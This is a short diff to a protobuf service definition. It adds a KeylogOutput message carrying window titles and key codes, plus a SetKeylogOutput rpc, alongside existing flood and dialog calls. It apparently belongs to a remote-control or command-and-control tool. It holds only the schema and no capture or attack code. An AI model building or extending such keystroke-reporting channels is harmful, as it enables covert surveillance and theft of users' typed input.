@@ -41,6 +41,12 @@ message DialogOutput {
     ClientDataRequest id = 2;
 }
 
+message KeylogOutput {
+    ClientDataRequest id = 3;
+    string windowTitle = 1;
+    int32 key = 2;
+}
+
 message ClientDataRequest { string client_id = 1; }
 
 message ClientDataOnScreenTextResponse { ClientOnScreenData on_screen = 1; }
@@ -53,4 +59,5 @@ service Consumer {
     rpc GetFlood(Void) returns (FloodData);
     rpc GetDialog(ClientDataRequest) returns (DialogData);
     rpc SetDialogOutput(DialogOutput) returns (Void);
+    rpc SetKeylogOutput(KeylogOutput) returns (Void);
 }
